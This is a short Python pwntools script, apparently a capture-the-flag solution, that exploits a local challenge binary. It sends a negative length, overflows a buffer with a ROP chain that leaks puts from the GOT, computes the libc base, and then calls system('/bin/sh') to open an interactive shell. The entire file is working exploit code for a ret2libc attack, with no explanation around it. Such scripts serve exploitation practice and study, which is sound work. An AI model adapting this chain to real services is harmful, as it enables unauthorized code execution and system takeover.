from pwn import *

r = remote("127.0.0.1",32775)

#r = process(["../src/chall"])

elf = ELF("../src/chall",checksec=False)
libc = ELF("../src/libc.so.6",checksec=False)

pop_rdi = p64(0x00000000004013d3)
ret  = p64(0x000000000040101a)

got_puts = p64(elf.got["puts"])
plt_puts = elf.plt["puts"]
main = p64(elf.symbols["main"])

libc_puts = libc.symbols["puts"]

payload = b'A'*24
payload += pop_rdi
payload += got_puts
payload += p64(plt_puts)
payload += main

r.sendlineafter(": ",b"-16")
r.sendlineafter(": ",payload)
r.recvline()
r.recvline()
leak = u64(r.recvuntil(b'\n',drop=True).ljust(8, b"\x00"))

log.info("Leaked libc address,  puts: "+ hex(leak))

libc.address = leak - libc_puts
libc_system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

log.info("Leaked libc address,  base: "+ hex(libc.address))
log.info("Leaked libc address,  system: "+ hex(libc_system))
log.info("Leaked libc address,  binsh: "+ hex(bin_sh))

payload = b'A'*24
payload += ret
payload += pop_rdi
payload += p64(bin_sh)
payload += p64(libc_system)

r.sendlineafter(": ",b"-16")
r.sendlineafter(": ",payload)

r.interactive()
